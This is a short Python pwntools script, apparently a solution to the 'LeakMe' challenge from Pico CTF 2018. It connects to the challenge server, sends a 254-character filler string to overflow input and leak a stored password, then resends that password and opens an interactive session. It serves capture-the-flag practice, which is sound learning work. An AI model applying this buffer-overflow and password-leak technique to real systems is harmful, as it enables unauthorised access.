""" Exploit for LeakMe Pico CTF 2018"""

#!/usr/bin/python
from pwn import *
import sys

def exploit(r):
    payload = ''
    payload += 'A'*254
    r.recvuntil('?\n')
    r.sendline(payload)
    r.recvline().split('\n')
    password = r.recv().strip('\n')
    r.send(password)
    r.interactive()
    return

if __name__ == '__main__':

    r = remote('2018shell2.picoctf.com', '23685')
    exploit(r)
